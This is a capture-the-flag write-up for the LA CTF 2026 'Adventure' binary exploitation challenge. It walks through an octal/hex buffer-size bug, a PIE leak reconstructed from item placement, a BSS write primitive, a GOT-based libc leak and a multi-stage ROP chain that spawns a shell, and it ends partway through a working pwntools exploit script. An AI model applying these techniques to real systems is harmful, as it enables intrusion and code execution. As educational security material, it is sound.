# LA CTF 2026 – Adventure (Pwn) Writeup

**Category:** Binary Exploitation  
**Flag:** `lactf{Th3_835T_345T3r_399_i5_4_fl49}` ("The BEST EASTER EGG is A FLAG")  
**Difficulty:** Hard  
**Techniques:** Stack buffer overflow, PIE leak via algorithmic weakness, BSS write primitive, multi-stage ROP chaining, stack pivot via `leave; ret`  

---

## Table of Contents

1. [Challenge Overview](#1-challenge-overview)
2. [Initial Reconnaissance](#2-initial-reconnaissance)
3. [Static Analysis](#3-static-analysis)
4. [Dynamic Analysis](#4-dynamic-analysis)
5. [Vulnerability](#5-vulnerability)
6. [Exploit Strategy Overview](#6-exploit-strategy-overview)
7. [Phase 1 – PIE Leak via Board Mapping](#7-phase-1--pie-leak-via-board-mapping)
8. [Phase 2 – BSS Write Primitive](#8-phase-2--bss-write-primitive)
9. [Phase 3 – Libc Leak via `last_item`](#9-phase-3--libc-leak-via-last_item)
10. [Phase 4 – ROP Chain and Shell](#10-phase-4--rop-chain-and-shell)
11. [Full Exploit Script](#11-full-exploit-script)
12. [Key Lessons](#12-key-lessons)

---

## 1. Challenge Overview

The challenge is a text-based dungeon adventure game on a 16×16 grid. You play as an adventurer collecting items. The available commands are:

```
n / s / e / w   – Move north/south/east/west
look            – See what item is at your current position
grab            – Pick up an item at your position
inv             – Print inventory
help            – Show help
quit            – Exit
```

There are 8 items on the board: Sword, Shield, Potion, Key, Scroll, Amulet, Crown, **Flag**.
Grabbing the **Flag** triggers a password prompt — which is where the vulnerability lives.

The game runs for a maximum of **300 moves**. After that, it forces you out.

**Files provided:**
```
chall_patched       – Binary (patched to use local libc)
chall.c             – Source code
libc.so.6           – glibc 2.39
ld-linux-x86-64.so.2
Dockerfile
```

---

## 2. Initial Reconnaissance

### File Type and Architecture

```bash
file chall_patched
```
```
chall_patched: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

**Key notes:**
- 64-bit x86-64
- PIE enabled (addresses are randomised at runtime)
- Dynamically linked (uses libc)
- **Not stripped** (symbol names are preserved — very helpful!)

### Security Protections

```bash
checksec --file=chall_patched
```
```
RELRO:    Full RELRO       ← GOT is read-only, no GOT overwrite
Stack:    No canary found  ← Stack overflow undetected!
NX:       NX enabled       ← No shellcode on stack
PIE:      PIE enabled      ← Base address randomised
```

**The missing stack canary is the key weakness.** Everything else is enabled.

### Libc Version

```bash
strings libc.so.6 | grep "GNU C Library"
```
```
glibc 2.39 (Ubuntu GLIBC 2.39-0ubuntu8.6)
```

### Strings in Binary

```bash
strings chall_patched | grep -E "flag|password|easter"
```
```
Speak the ancient password to
check_flag_password
easter_egg
```

This tells us:
- There's a function called `check_flag_password`
- There's an "easter egg" password check
- A password prompt is shown

### Symbol Table

```bash
nm chall_patched | grep -E " [bBdD] "
```
```
0x40a0  B  history
0x4020  D  last_item
0x4040  D  item_names
0x4a00  B  move_count
0x4a04  B  player_x
0x4a08  B  player_y
0x4a20  B  board
0x4e20  B  inventory
```

```bash
readelf -s chall_patched | grep FUNC | grep -v UND
```
```
0x1adf  main
0x15b5  check_flag_password
0x138b  print_inventory
0x1731  grab_item
0x19ca  init_board
0x1853  move_player
```

**All offsets above are PIE-relative.** At runtime, add the PIE base.

### PLT (Library Functions Used)

```bash
objdump -M intel -d chall_patched | grep "@plt>:"
```
```
fgets, puts, printf, strcspn, strcmp, strncpy, memset, setbuf, fflush
```

No `system`, no `execve`, no `gets`. Exploitation requires ROP.

---

## 3. Static Analysis

### `main()` – The Game Loop

```c
char input[8];  // 8-byte input buffer on stack

while (move_count < 300) {
    fgets(input, sizeof(input), stdin);  // reads max 8 bytes safely
    input[strcspn(input, "\n")] = 0;

    // Every command is saved to history:
    strncpy(history[move_count], input, 7);
    history[move_count][7] = '\0';       // null byte forced at byte 7
    move_count++;

    // Process: n, s, e, w, look, grab, inv, help, quit
}
```

**Key findings:**
- Input buffer is only 8 bytes — safe, no overflow here
- **Every command is stored in `history[move_count]`** which is `history[300][8]` in BSS at offset `0x40a0`
- Each history slot holds 7 bytes of content + forced null at byte 7
- This history buffer becomes our ROP chain storage later

### `init_board()` – Item Placement

```c
void init_board(void) {
    unsigned long addr = (unsigned long)main;  // runtime address of main!
    unsigned char *bytes = (unsigned char *)&addr;

    for (int i = 7; i >= 0; i--) {
        int x = (bytes[i] >> 4) & 0x0F;  // upper 4 bits → x
        int y = bytes[i] & 0x0F;          // lower 4 bits → y

        while (board[y][x] != 0) {        // collision: probe forward
            x = (x + 1) % 16;
            if (x == 0) y = (y + 1) % 16;
        }
        board[y][x] = i + 1;              // place item i
    }
}
```

**Key finding:** Item positions are **directly derived from the bytes of `main`'s runtime address**. Since PIE randomises this address, items spawn at different positions each run. This is the PIE leak mechanism.

### `grab_item()` – Trigger Point

```c
void grab_item(void) {
    int item_idx = board[player_y][player_x] - 1;
    inventory[item_idx] = 1;
    board[player_y][player_x] = 0;
    last_item = item_names[item_idx];  // update global last_item pointer

    if (item_idx == 7) {               // Flag is item index 7
        check_flag_password();         // VULNERABILITY IS HERE
    }
}
```

### `check_flag_password()` – The Vulnerable Function

```c
void check_flag_password(void) {
    char password[0020];  // ← OCTAL! 0020 octal = 16 decimal bytes

    printf("  Password: ");
    fflush(stdout);

    if (fgets(password, 0x20, stdin) == NULL)  // ← HEX! 0x20 = 32 bytes
        return;

    password[strcspn(password, "\n")] = 0;

    if (strcmp(password, "easter_egg") == 0) {
        puts("CONGRATULATIONS!");
    } else {
        puts("The Flag rejects your words...");
    }
}
```

**THE BUG:** The developer mixed up notation:
- `0020` is **octal** → 16 bytes
- `0x20` is **hexadecimal** → 32 bytes

Buffer is 16 bytes but `fgets` reads up to 32 bytes. **16-byte stack overflow.**

### `print_inventory()` – The Leak Gadget

```c
printf("  ║  %2d,%2d %d/%d %3d/%3d %-6s   ║\n",
       player_x, player_y,
       item_count, NUM_ITEMS,
       move_count, MAX_MOVES,
       last_item);               // prints whatever last_item POINTS TO
```

`%-6s` prints the string that `last_item` points to. If we overwrite `last_item` with a pointer to a libc address, `printf` will print the raw bytes of that address. **This is our libc leak.**

### Assembly of `check_flag_password` — The Gadget

```bash
objdump -M intel -d chall_patched | grep -A 40 "<check_flag_password>"
```

Key section at offset `0x164d`:

```asm
; PIE + 0x164d  ← THE FGETS GADGET
164d:  mov    rdx, [stdin]
1654:  lea    rax, [rbp-0x10]    ; buffer = RBP - 16
1658:  mov    esi, 0x20
165d:  mov    rdi, rax
1660:  call   fgets              ; fgets(RBP-16, 32, stdin)
...
172f:  leave                     ; rsp = rbp; pop rbp
1730:  ret
```

**Critical observation:** The buffer address passed to `fgets` is `rbp - 0x10`. **Whoever controls RBP controls where fgets writes.** This is the write primitive.

Also note:
```bash
objdump -M intel -d chall_patched | grep -E "14b7:"
```
```
14b7:  leave
14b8:  ret
```
There is a standalone `leave; ret` at offset `0x14b7` — used for stack pivoting.

### Other Important Gadgets

```bash
ROPgadget --binary chall_patched | grep "pop rbp ; ret"
```
```
0x1233:  pop rbp ; ret
```

```bash
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
```
```
0x10f78b:  pop rdi ; ret
```

---

## 4. Dynamic Analysis

### Start pwndbg

```bash
gdb ./chall_patched
```

Inside gdb/pwndbg:

```
pwndbg> checksec
pwndbg> info functions          # list all functions
pwndbg> disassemble check_flag_password   # view assembly
```

### Examine the Stack Overflow

```bash
pwndbg> break check_flag_password
pwndbg> run
```

Play until you grab the flag, then at the password prompt:

```
pwndbg> info frame              # shows saved RBP and RIP
pwndbg> x/20gx $rsp            # inspect stack around current frame
```

Typical output:
```
$rsp → [16 bytes buffer]
       [saved RBP]    ← 16 bytes into buffer
       [saved RIP]    ← 24 bytes into buffer
```

### Verify Overflow

```bash
pwndbg> break *check_flag_password+0x17a   # just before leave;ret
pwndbg> continue
# When password prompt appears, type 32 'A' characters
```

After sending overflow:
```
pwndbg> info registers rbp rip
pwndbg> x/4gx $rsp
```

You'll see RBP and RIP overwritten with `0x4141414141414141`.

### Verify the PIE Base

After running:
```bash
pwndbg> vmmap
```
Shows memory layout including the binary's load address (PIE base).

### Examine History Buffer

After sending a few commands:
```bash
pwndbg> x/20gx &history       # inspect raw history memory
```

You'll see your commands stored as 8-byte slots.

### Examine `last_item`

```bash
pwndbg> x/gx &last_item       # shows current value of last_item pointer
pwndbg> x/s *(char**)&last_item  # dereference and print as string
```

### Examine GOT

```bash
pwndbg> got                   # show GOT entries and resolved addresses
pwndbg> x/gx 0x<pie_base>+0x3f98   # GOT[puts] contains libc puts address
```

### Crash Verification

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'grab\n')" | cat - | gdb ./chall_patched -ex "run" -ex "bt"
```

Or manually: run, reach flag, send 32-byte password → segfault confirms overflow.

---

## 5. Vulnerability

### Root Cause

In `check_flag_password()`:

```c
char password[0020];          // octal 0020 = 16 bytes
fgets(password, 0x20, stdin); // hex 0x20   = 32 bytes
```

The developer mixed **octal** (`0020`) and **hexadecimal** (`0x20`) notation. Both look similar but differ:

| Notation | Value |
|----------|-------|
| `0020`   | Octal → **16** bytes |
| `0x20`   | Hex   → **32** bytes |

### Stack Layout in `check_flag_password`

```
Lower addresses
┌─────────────────────────────────┐
│ password[0..15]  (16 bytes)     │ ← buffer starts here
├─────────────────────────────────┤
│ saved RBP        (8 bytes)      │ ← at offset 16
├─────────────────────────────────┤
│ saved RIP        (8 bytes)      │ ← at offset 24 ← CONTROL RIP!
└─────────────────────────────────┘
Higher addresses
```

fgets reads 32 bytes → overflow of 16 bytes → we control saved RBP and saved RIP.

**No stack canary** means this overflow is cleanly exploitable.

### Why Can't We Just Jump to `system`?

Three reasons:
1. **PIE**: We don't know code addresses until we leak PIE base
2. **NX**: Can't execute shellcode on stack
3. **Full RELRO**: Can't overwrite GOT entries

We need a multi-stage approach:
1. Leak PIE base → know binary addresses
2. Leak libc base → know libc addresses
3. ROP chain → call `system("/bin/sh")`

---

## 6. Exploit Strategy Overview

```
Stage 0: Walk board → leak PIE base
         ↓
Stage 1: Plant ROP chains in history buffer (as raw bytes)
         ↓
Stage 2: Overflow → BSS write primitive → overwrite last_item = &GOT[puts]
         → pivot to chainA
         ↓
Stage 3: chainA runs print_inventory → leaks libc puts address
         → pivot to fgets again
         ↓
Stage 4: Two more fgets writes build system("/bin/sh") ROP chain in high .bss
         → final pivot executes chain
         ↓
Stage 5: Shell → cat /app/flag.txt
```

---

## 7. Phase 1 – PIE Leak via Board Mapping

### Why This Works

`init_board()` uses bytes of `main`'s runtime address to place items:

```
main address (little-endian bytes): [b0, b1, b2, b3, b4, b5, 0x00, 0x00]

Item 7 (Flag)  uses byte[7] = 0x00 → x = 0,  y = 0
Item 6 (Crown) uses byte[6] = 0x00 → x = 0,  y = 0  (collision!)
Item 5 (Amulet) uses byte[5]       → x = upper nibble, y = lower nibble
...
Item 0 (Sword) uses byte[0]        → x = upper nibble, y = lower nibble
```

If two items collide, the second one moves forward:
```
x = (x + 1) % 16
if x == 0: y = (y + 1) % 16
```

By observing where all 8 items spawn, we can reverse-engineer the bytes of `main`'s address and calculate the PIE base.

### Why Only 6 Bytes Matter

64-bit Linux addresses look like `0x00005555xxxxxxxx` or `0x000055fexxxxxxxx`. The top two bytes (`bytes[6]` and `bytes[7]`) are always `0x00`. So we reconstruct 6 bytes (bytes 0–5) and know the top 2 are zero.

### Reconstructing the Address

```python
def reconstruct_address(items):
    candidates = {i: [] for i in range(8)}
    candidates[6] = [0]   # always 0x00
    candidates[7] = [0]   # always 0x00

    for i in range(5, -1, -1):
        # Simulate the placement of items i+1 through 7 (already known)
        occupied = {items[j] for j in range(i + 1, 8) if j in items}
        want = items.get(i)

        for b in range(256):
            x = (b >> 4) & 0x0F
            y = b & 0x0F
            # Simulate collision probing
            while (x, y) in occupied:
                x = (x + 1) % 16
                if x == 0: y = (y + 1) % 16
            if (x, y) == want:
                candidates[i].append(b)

    # Resolve ambiguities: PIE base must be page-aligned (low 12 bits = 0)
    # Since pie_base = main_addr - 0x1adf, we need (main_addr - 0x1adf) & 0xfff == 0
    # This means main_addr & 0xfff must equal 0x1adf & 0xfff = 0xadf

    for b0 in candidates[0]:
        for b1 in candidates[1]:
            # Early pruning: check low 12 bits
            if (b0 | ((b1 & 0xf) << 8)) != (MAIN & 0xfff):
                continue
            for b2 in candidates[2]:
                for b3 in candidates[3]:
                    for b4 in candidates[4]:
                        for b5 in candidates[5]:
                            addr = b0 | (b1<<8) | (b2<<16) | (b3<<24) | (b4<<32) | (b5<<40)
                            if ((addr - MAIN) & 0xfff) == 0:
                                return addr
```

### Board Walking

Walk the 16×16 board in a **serpentine (snake) pattern** to find all items efficiently:

```
Row 0: → → → → → → → → → → → → → → →    (east ×15)
       ↓
Row 1: ← ← ← ← ← ← ← ← ← ← ← ← ← ← ←    (west ×15)
       ↓
Row 2: → → → → → → → → → → → → → → →
...
```

Total moves: 15 east/west × 16 rows + 15 south = **255 moves**. Within the 300 limit.

```python
def explore_board(r):
    items = {}
    px, py = 0, 0

    resp = send_cmd(r, "look")   # check starting position
    # parse for item name in response...

    for row in range(16):
        if row > 0:
            resp = send_cmd(r, "s")   # move south between rows
            py += 1
            # check for item...

        steps = range(15)
        direction = "e" if row % 2 == 0 else "w"
        for _ in steps:
            resp = send_cmd(r, direction)
            px += 1 if direction == "e" else -1
            # check "You spot a X here!" in resp
```

**Parsing items from movement responses:**

When you move into a cell containing an item, the game prints:
```
You spot a Sword here!
```

Parse this to record `{item_index: (x, y)}`.

### Running the Board Walk

```bash
python3 working_exploit.py
```

Expected output:
```
[*] Found Flag (idx=7) at (0,0)
[*] Found Crown (idx=6) at (1,0)
[*] Found Amulet (idx=5) at (5,5)
...
[*] Found 8 items in 243 moves.
[*] Reconstructed main addr: 0x55de84296adf
[*] PIE base: 0x55de84295000
```

**Verify manually:**
```bash
gdb ./chall_patched -ex "start" -ex "print/x main"
```
Compare with reconstructed address.

---

## 8. Phase 2 – BSS Write Primitive

### The Core Concept

A "write primitive" means: **we can write arbitrary data to an arbitrary writable address**.

We build this primitive by hijacking the `fgets` call inside `check_flag_password`.

### The Gadget

At offset `0x164d` inside `check_flag_password`:

```asm
164d:  mov  rdx, [stdin]
1654:  lea  rax, [rbp-0x10]   ; buffer address = RBP - 16
1658:  mov  esi, 0x20
165d:  mov  rdi, rax
1660:  call fgets              ; fgets(RBP-16, 32, stdin)
...
172f:  leave                   ; rsp = rbp; pop rbp
1730:  ret
```

**The key line is `lea rax, [rbp-0x10]`.**
The buffer address is computed from RBP. If we control RBP, we control where fgets writes.

```
If RBP = target + 0x10
Then fgets writes to [RBP - 0x10] = target
```

### How To Use It

**Overflow #1 (at the first "Password:" prompt):**

```python
payload  = b'A' * 16                          # fill 16-byte password buffer
payload += p64(target + 0x10)                 # overwrite saved RBP
payload += p64(pie_base + 0x164d)[:7]         # overwrite saved RIP → jump to gadget
                                               # only 7 bytes (fgets auto-adds \x00)
```

After this, execution jumps to `0x164d`. The program is now **inside** `check_flag_password`, about to call `fgets(target, 32, stdin)`. **Waiting for our next input.**

> **Common confusion:** Why jump back into `check_flag_password` instead of somewhere else?
> Because the fgets gadget at `0x164d` is a ready-made write primitive. It:
> 1. Calls fgets with a buffer we control (via RBP)
> 2. Then does `leave; ret` which also pivots the stack
> Two things in one gadget.

### Why Only 7 Bytes for RIP?

```python
p64(pie_base + 0x164d)[:7]   # only 7 bytes!
```

`fgets` reads up to 31 bytes then **automatically appends a `\x00` null byte** as byte 32.

Our payload layout:
```
[16 padding][8 RBP][7 bytes of RIP] + [\x00 added by fgets]
 = 16 + 8 + 7 + 1 = 32 bytes total ✓
```

The `\x00` fills byte 8 of the RIP value. Since all 64-bit userspace addresses have `0x00` as their top byte (e.g., `0x00005555...`), this works perfectly — fgets fills the null we need.

### Planting ROP Chains in History BEFORE the Overflow

Before triggering the overflow, we fill specific history slots with ROP gadget addresses. These addresses are sent as raw bytes using the game's own input mechanism:

```python
def plant_history_entry(r, addr_value):
    addr_bytes = p64(addr_value)
    # Check for bad bytes (null or newline would truncate)
    for j in range(6):
        if addr_bytes[j] == 0x00:
            raise ValueError("NUL byte in address!")
        if addr_bytes[j] == 0x0a:
            raise ValueError("Newline in address!")
    r.send(addr_bytes[:6] + b'\n')  # send 6 bytes + newline
    r.recvuntil(b'> ')
```

Why only 6 bytes? Because addresses look like `0x00005555xxxxxxxx` — top 2 bytes are zero. `strncpy` in main copies 7 bytes then adds a null at position 7. Sending 6 real bytes + newline:
- `strncpy` copies our 6 bytes
- The 7th byte position = `\x00` (from the forced null in main)
- The 8th byte = `\x00` (already in memory, BSS is zero-initialised)

Result: the history slot contains our full 8-byte address.

**ChainA** (planted before the exploit triggers):
```
history[N+0] = 0x4141414141414141  ← dummy (becomes RBP, don't care)
history[N+1] = &print_inventory    ← called to leak libc
history[N+2] = &pop_rbp_ret        ← set up RBP for next write
history[N+3] = chain_base + 0x10   ← value loaded into RBP
history[N+4] = &FGETS_SETUP        ← call fgets again!
```

**ChainB** (planted right after chainA):
```
history[N+5] = 0x4242424242424242  ← dummy
history[N+6] = &pop_rbp_ret        ← set up RBP
history[N+7] = chain_base + 0x20   ← new RBP value
history[N+8] = &FGETS_SETUP        ← call fgets again!
```

---

## 9. Phase 3 – Libc Leak via `last_item`

### Why `last_item` Specifically?

`last_item` is a global pointer (at PIE + `0x4020`) that holds the name of the last item grabbed. It's printed by `print_inventory()` using `%-6s`:

```c
printf("... %-6s ║\n", last_item);
```

`%-6s` treats `last_item` as a **pointer** and prints the **string it points to** — raw bytes until a null byte.

If we change `last_item` to point to `GOT[puts]`:
- `GOT[puts]` contains the **resolved libc address of `puts`**
- `printf` will print the raw bytes of that address
- We read those bytes and calculate libc base

> **Why GOT[puts]?** After the first call to `puts`, the dynamic linker fills `GOT[puts]` with the real address of `puts` in libc. This is a reliable libc pointer we can leak.

### The Write: Overwriting `last_item`

We want to write `&GOT[puts]` into `last_item`.

`last_item` is at PIE + `0x4020`. We need RBP = `0x4020 + 0x10` = `0x4030` so that `fgets` writes to `[RBP - 0x10]` = `0x4020`.

**Overflow payload** (sent at "Password:" prompt):
```python
payload  = b'A' * 16
payload += p64(pie_base + 0x4030)       # RBP → so fgets targets 0x4020 = last_item
payload += p64(pie_base + 0x164d)[:7]  # jump to fgets gadget
r.send(payload)
```

**Second input (the write payload):**

```python
chunk  = p64(pie_base + GOT_PUTS)    # bytes 0-7:   overwrites last_item
chunk += p64(0x4141414141414141)     # bytes 8-15:  overwrites last_item + 8 (padding)
chunk += p64(chainA_addr)            # bytes 16-23: new RBP → for leave;ret
chunk += p64(pie_base + LEAVE_RET)[:7]  # bytes 24-30: new RIP → leave;ret
r.send(chunk)
```

> **Common confusion:** Why doesn't the chunk payload start with 16 bytes of padding like the overflow did?
>
> **Because they write to DIFFERENT locations!**
>
> - The overflow payload writes to the **stack buffer** (`password[0..15]`)
> - The chunk payload writes to **BSS memory** (`last_item` at PIE+0x4020)
>
> When we jumped to `0x164d`, fgets is configured to write to `rbp-0x10 = last_item`. The very **first byte** of the chunk becomes the first byte of the new `last_item` value. There's no 16-byte buffer to fill — we're writing directly to the target address.

### Memory Layout After the Chunk Payload

```
Address             Content after write
───────────────────────────────────────
pie_base + 0x4020:  &GOT[puts]      ← last_item now points here!
pie_base + 0x4028:  0x4141...       ← padding
pie_base + 0x4030:  chainA_addr     ← RBP points here → for leave
pie_base + 0x4038:  LEAVE_RET       ← return address after leave
```

### The Double Pivot

After `fgets` finishes writing, `check_flag_password` hits `leave; ret` at `0x172f`:

```
leave:
    RSP = RBP = pie_base + 0x4030      (RBP we set in the overflow)
    pop RBP → RBP = [0x4030] = chainA_addr
    RSP = pie_base + 0x4038

ret:
    RIP = [0x4038] = LEAVE_RET
```

Now we're at `LEAVE_RET` (offset `0x14b7`):

```
leave:
    RSP = RBP = chainA_addr            (RBP = chainA_addr from above)
    pop RBP → RBP = [chainA_addr] = dummy value
    RSP = chainA_addr + 8

ret:
    RIP = [chainA_addr + 8] = &print_inventory
```

**RSP is now walking through chainA!** This is the double pivot — two consecutive `leave; ret` executions to transfer control from .data into the history buffer.

### chainA Executes

```
RSP at chainA_addr + 8  → &print_inventory  → ret jumps here
print_inventory() runs:
    printf("... %-6s ...", last_item)
    last_item = &GOT[puts]
    prints raw bytes of puts libc address!
print_inventory() returns to...

RSP at chainA_addr + 16 → &pop_rbp_ret     → ret jumps here
pop_rbp_ret executes:
    pop rbp = [RSP] = chain_base + 0x10
    ret → [RSP] = &FGETS_SETUP

FGETS_SETUP runs:
    fgets([rbp - 0x10], 32, stdin)
    fgets([chain_base + 0x10 - 0x10], 32, stdin)
    fgets([chain_base], 32, stdin)        ← waiting for Phase 4 input!
```

### Parsing the Leak

The inventory output looks like:
```
  ║   0, 0 1/8   244/300 [6 raw bytes of puts addr]   ║
```

The last field before `║` contains the raw bytes of the puts address:

```python
r.recvuntil(b'/300 ')        # skip to right before the leaked bytes
leaked_bytes = r.recvn(6)    # read exactly 6 bytes
puts_addr = u64(leaked_bytes + b'\x00\x00')
libc_base = puts_addr - libc.symbols['puts']
```

**Why 6 bytes?** Because the puts address looks like `0x00007f...xxxxxx`. The top 2 bytes are `\x00\x00`. `printf` with `%s` stops at the first null, so only 6 non-null bytes get printed.

```bash
# Verify libc base manually:
gdb ./chall_patched
pwndbg> break print_inventory
pwndbg> continue
pwndbg> x/gx &last_item        # should now be &GOT[puts]
pwndbg> x/gx *(void**)&last_item  # should be libc puts address
```

---

## 10. Phase 4 – ROP Chain and Shell

### Goal

Call `system("/bin/sh")`. On x86-64, function arguments go in registers:
- `rdi` = first argument = pointer to `"/bin/sh"` string

We need:
```asm
pop rdi          ; rdi = &"/bin/sh"
ret              ; jump to...
system           ; system("/bin/sh") → shell!
```

### Where to Build the Chain: `chain_base`

We build the final ROP chain at `chain_base = pie_base + 0x4FC8` (high .bss).

**Why this location?**
1. Far from important globals (history, stdout, stdin are at lower addresses)
2. `0x4FC8 % 16 == 8` — correct stack alignment for `system()` (x86-64 ABI requires 16-byte alignment at the point of `call`, so RSP must end in `...8` when entering `system`)

**Final ROP chain layout at `chain_base`:**
```
chain_base + 0x00:  dummy              ← consumed by leave as RBP
chain_base + 0x08:  &pop_rdi_ret      ← execution starts here
chain_base + 0x10:  &"/bin/sh"        ← pop_rdi loads this into rdi
chain_base + 0x18:  &system           ← ret jumps here → system("/bin/sh")
```

### Why Two Writes?

Each fgets call delivers 31 bytes, structured as:
```
bytes 0-7:   data to [rbp-0x10]
bytes 8-15:  data to [rbp-0x08]
bytes 16-23: new RBP (for leave)
bytes 24-30: new RIP (for ret, 7 bytes)
```

So each write delivers **16 bytes of useful data**. We need 32 bytes (4 addresses × 8). Two writes required.

### Write 1: Plant `dummy` + `pop_rdi`

Current state: fgets writes to `chain_base` (rbp = chain_base + 0x10).

```python
payload_w1 = flat([
    0x4141414141414141,      # → chain_base + 0x00 (dummy RBP)
    pop_rdi,                 # → chain_base + 0x08 (first gadget)
    chainB_addr,             # → new RBP (pivot to chainB)
    pie_base + LEAVE_RET,    # → new RIP (7 bytes)
])
r.send(payload_w1)
```

After leave;ret: pivots to chainB.

### chainB Executes

```
pop_rbp_ret:
    rbp = chain_base + 0x20   ← new RBP
    ret → FGETS_SETUP         ← calls fgets again

fgets([rbp-0x10], 32, stdin)
fgets([chain_base+0x20-0x10], 32, stdin)
fgets([chain_base+0x10], 32, stdin)  ← waiting for Write 2!
```

### Write 2: Plant `/bin/sh` + `system`

Current state: fgets writes to `chain_base + 0x10` (rbp = chain_base + 0x20).

```python
payload_w2 = flat([
    binsh,                   # → chain_base + 0x10 ("/bin/sh" address)
    system,                  # → chain_base + 0x18 (system address)
    chain_base,              # → new RBP = chain_base itself!
    pie_base + LEAVE_RET,    # → new RIP (7 bytes)
])
r.send(payload_w2)
```

After leave;ret: RBP = chain_base, RSP = chain_base → pivots into our chain.

**Both writes sent together (they're sequential, no prompt between them):**
```python
r.send(payload_w1 + payload_w2)
```

### Final Pivot and Execution

After write 2, `leave; ret` with `rbp = chain_base`:

```
leave:
    RSP = chain_base
    pop RBP → [chain_base] = dummy
    RSP = chain_base + 0x08

ret:
    RIP = [chain_base + 0x08] = pop_rdi gadget
```

`pop_rdi; ret` executes:
```
pop rdi = [chain_base + 0x10] = &"/bin/sh"
RSP = chain_base + 0x18
ret → [chain_base + 0x18] = system
```

`system("/bin/sh")` → **shell!**

### Get the Flag

```python
r.sendline(b'cat /app/flag.txt')
```

> **Flag path note:** The Dockerfile uses `pwn.red/jail` which copies the Ubuntu rootfs to `/srv` and chroots into it. So `/srv/app/flag.txt` in the image becomes `/app/flag.txt` inside the running jail.

---

## 11. Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF('./chall_patched', checksec=False)
context.log_level = 'info'
libc = ELF('./libc.so.6', checksec=False)

# PIE-relative offsets
MAIN        = 0x1ADF
FGETS_SETUP = 0x164D
LEAVE_RET   = 0x14B7
POP_RBP_RET = 0x1233
PRINT_INV   = 0x138B
GOT_PUTS    = 0x3F98
LAST_ITEM   = 0x4020
HISTORY     = 0x40A0
CHAIN_BASE  = 0x4FC8  # high .bss, %16==8 for system() alignment

NUM_ITEMS  = 8
BOARD_SIZE = 16

def connect():
    if args.REMOTE or args.R:
        return remote('chall.lac.tf', 31337)
    else:
        return process('./chall_patched')

def send_cmd(r, cmd):
    r.sendline(cmd.encode() if isinstance(cmd, str) else cmd)
    return r.recvuntil(b'> ', timeout=10)

def plant_history_entry(r, addr_value):
    """Store a 64-bit address in a history slot by sending 6 raw bytes."""
    addr_bytes = p64(addr_value)
    for j in range(6):
        if addr_bytes[j] == 0x00:
            raise ValueError(f"NUL at byte {j}: {hex(addr_value)}")
        if addr_bytes[j] == 0x0a:
            raise ValueError(f"Newline at byte {j}: {hex(addr_value)}")
    r.send(addr_bytes[:6] + b'\n')
    return r.recvuntil(b'> ', timeout=10)

def explore_board(r):
    """Serpentine walk to find all 8 items."""
    items = {}
    px, py = 0, 0
    item_names_list = ["Sword","Shield","Potion","Key","Scroll","Amulet","Crown","Flag"]

    def parse_spot(resp):
        for i, name in enumerate(item_names_list):
            if f"spot a {name}".encode() in resp or f"glimmering {name}".encode() in resp:
                return i
        return None

    resp = send_cmd(r, "look")
    idx = parse_spot(resp)
    if idx is not None:
        items[idx] = (px, py)

    moves_used = 1

    for row in range(BOARD_SIZE):
        if row > 0:
            resp = send_cmd(r, "s")
            py += 1
            moves_used += 1
            idx = parse_spot(resp)
            if idx is not None and idx not in items:
                items[idx] = (px, py)

        direction = "e" if row % 2 == 0 else "w"
        for _ in range(BOARD_SIZE - 1):
            resp = send_cmd(r, direction)
            px += 1 if direction == "e" else -1
            moves_used += 1
            idx = parse_spot(resp)
            if idx is not None and idx not in items:
                items[idx] = (px, py)
                log.info(f"Found {item_names_list[idx]} (idx={idx}) at ({px},{py})")
            if len(items) == NUM_ITEMS:
                return items, px, py, moves_used

    return items, px, py, moves_used

def reconstruct_address(items):
    """Reverse-engineer main's address from item positions."""
    candidates = {i: [] for i in range(8)}
    candidates[6] = [0]
    candidates[7] = [0]

    for i in range(5, -1, -1):
        occupied = {items[j] for j in range(i + 1, NUM_ITEMS) if j in items}
        want = items.get(i)
        if want is None:
            raise ValueError(f"Missing item {i}")
        for b in range(256):
            x = (b >> 4) & 0x0F
            y = b & 0x0F
            while (x, y) in occupied:
                x = (x + 1) % BOARD_SIZE
                if x == 0: y = (y + 1) % BOARD_SIZE
            if (x, y) == want:
                candidates[i].append(b)
        if not candidates[i]:
            raise ValueError(f"No candidates for byte {i}")

    target_low12 = MAIN & 0xFFF
    for b0 in candidates[0]:
        for b1 in candidates[1]:
            if (b0 | ((b1 & 0xf) << 8)) != target_low12:
                continue
            for b2 in candidates[2]:
                for b3 in candidates[3]:
                    for b4 in candidates[4]:
                        for b5 in candidates[5]:
                            addr = b0|(b1<<8)|(b2<<16)|(b3<<24)|(b4<<32)|(b5<<40)
                            if ((addr - MAIN) & 0xFFF) == 0:
                                return addr
    raise ValueError("No page-aligned solution found")

def navigate_to(r, px, py, tx, ty):
    moves = 0
    while px != tx:
        send_cmd(r, "e" if px < tx else "w")
        px += 1 if px < tx else -1
        moves += 1
    while py != ty:
        send_cmd(r, "s" if py < ty else "n")
        py += 1 if py < ty else -1
        moves += 1
    return moves, px, py

def overflow_payload(rbp_val, ret_val):
    p = b'A' * 16 + p64(rbp_val) + p64(ret_val)[:7]
    assert len(p) == 31
    return p

def fgets_redirect_payload(val0, val1, new_rbp, ret_addr):
    p = p64(val0) + p64(val1) + p64(new_rbp) + p64(ret_addr)[:7]
    assert len(p) == 31
    return p

def exploit_once():
    r = connect()
    r.recvuntil(b'> ', timeout=15)

    # ── Phase 1: PIE Leak ────────────────────────────────────────────
    log.info("Phase 1: Board exploration & PIE leak")
    items, px, py, moves_used = explore_board(r)
    log.info(f"Found {len(items)}/8 items in {moves_used} moves")

    main_addr = reconstruct_address(items)
    pie_base  = main_addr - MAIN
    log.success(f"PIE base: {hex(pie_base)}")

    if pie_base & 0xFFF != 0:
        log.error("PIE base not page-aligned!")
        r.close()
        return None

    chain_base_addr = pie_base + CHAIN_BASE

    # ── Phase 2: Plant Chains in History ─────────────────────────────
    log.info("Phase 2: Planting ROP chains in history")
    chainA_idx  = moves_used
    chainA_addr = pie_base + HISTORY + 8 * chainA_idx
    chainB_idx  = chainA_idx + 5
    chainB_addr = pie_base + HISTORY + 8 * chainB_idx

    send_cmd(r, "AAAAAA");           moves_used += 1   # dummy RBP for chainA
    plant_history_entry(r, pie_base + PRINT_INV);  moves_used += 1
    plant_history_entry(r, pie_base + POP_RBP_RET); moves_used += 1
    plant_history_entry(r, chain_base_addr + 0x10); moves_used += 1
